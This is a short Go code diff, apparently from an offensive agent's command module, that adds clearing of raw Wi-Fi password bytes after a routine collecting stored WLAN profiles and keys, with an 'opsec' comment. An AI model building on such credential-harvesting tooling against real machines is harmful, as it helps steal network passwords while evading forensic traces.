@@ -1,6 +1,7 @@
 package commands
 
 import (
+	"fawkes/pkg/structs"
 	"strings"
 )
 
@@ -36,6 +37,7 @@ func getWlanProfiles() ([]wlanProfile, error) {
 		)
 		if err == nil {
 			key = strings.TrimSpace(string(keyOut))
+			structs.ZeroBytes(keyOut) // opsec: clear raw password bytes from subprocess
 		}
 
 		profiles = append(profiles, wlanProfile{
